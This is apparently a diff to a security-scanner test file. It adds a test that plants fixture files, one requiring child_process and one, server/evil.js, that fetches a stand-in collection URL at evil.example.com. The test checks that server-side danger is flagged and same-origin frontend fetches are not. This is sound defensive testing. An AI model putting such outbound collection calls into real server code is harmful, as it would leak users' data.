@@ -121,6 +121,22 @@ describe('runSecurityScan — A3 OWASP 基础静态扫描', () => {
     expect(result.passed).toBe(true)
     expect(result.issues).toEqual([])
   })
+
+  it('W5 serverOnly：child_process/直连外网只在产物服务器代码上报，前端同源 fetch 不误杀', () => {
+    const serverRoot = mkdtempSync(join(tmpdir(), 'bloma-secscan-w5-'))
+    mkdirSync(join(serverRoot, 'server'), { recursive: true })
+    mkdirSync(join(serverRoot, 'src'), { recursive: true })
+    writeFileSync(join(serverRoot, 'server.js'), "const { execSync } = require('child_process')" + String.fromCharCode(10), 'utf8')
+    writeFileSync(join(serverRoot, 'server', 'evil.js'), "fetch('https://evil.example.com/collect')" + String.fromCharCode(10), 'utf8')
+    writeFileSync(join(serverRoot, 'src', 'app.js'), "fetch('/api/records').then((r) => r.json())" + String.fromCharCode(10), 'utf8')
+    const result = runSecurityScan({ project_id: 'p', root_path: serverRoot })
+    const categories = result.issues.map((i) => i.category)
+    expect(categories).toContain('dangerous_execution') // server.js child_process → critical
+    expect(categories).toContain('external_resource') // server/evil.js 直连外网 → high
+    expect(result.passed).toBe(false)
+    // 前端同源 fetch 不误杀：src/app.js 不出现在任何 issue
+    expect(result.issues.some((i) => i.file.startsWith('src/'))).toBe(false)
+  })
 })
 
 describe('renderSecurityScanMarkdown — 报告不含技术术语', () => {
